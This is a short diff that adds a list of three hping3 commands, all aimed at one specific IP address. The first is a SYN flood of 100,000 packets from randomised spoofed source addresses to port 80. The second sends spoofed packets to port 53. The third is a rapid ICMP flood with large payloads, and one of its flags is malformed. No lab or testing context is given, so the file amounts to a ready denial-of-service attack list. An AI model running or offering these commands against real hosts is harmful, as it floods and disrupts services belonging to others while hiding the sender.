@@ -1,0 +1,3 @@
+1 - hping3 -c 100000 --rand-source 159.203.44.155 -p 80 -S
+2 - hping3 -c 9000 -i u1000 -a spoofed_source -k -s 53 -p 53 -M 100 159.203.44.155
+3 - hping3 -c 11000 -i u13 -d 1024 --icmp --100 159.203.44.155
